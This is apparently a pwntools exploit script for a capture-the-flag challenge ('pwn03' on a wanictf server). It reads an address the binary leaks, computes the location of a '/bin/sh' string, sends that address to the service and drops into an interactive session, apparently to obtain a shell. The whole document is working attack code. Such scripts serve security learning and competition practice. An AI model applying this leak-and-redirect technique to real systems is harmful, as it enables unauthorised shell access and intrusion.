from pwn import *

binary = "./pwn03"
host ="binsh.wanictf.org"
port = 9003

elf = ELF(binary)
context.binary = binary
context.log_level = "info"

breakpoints = []
commands = """
continue
"""

if len(sys.argv) >= 2 and sys.argv[1] == "r":
	# remote
	s = remote(host, port)
elif len(sys.argv) >= 2 and sys.argv[1] == "d":
	# debug
	s = gdb.debug(binary, commands)
	# libc = elf.libc
else:
	# local
	s = process(binary)
	libc = elf.libc
	# libc = ELF(libc)

payload = b""
s.recvuntil("is ")
indata = int(s.recv(14),16)
log.info("input @ " + hex(indata))
log.info("binsh @ " + hex(indata+16))

s.sendline(hex(indata+16))
sleep(1)
s.interactive()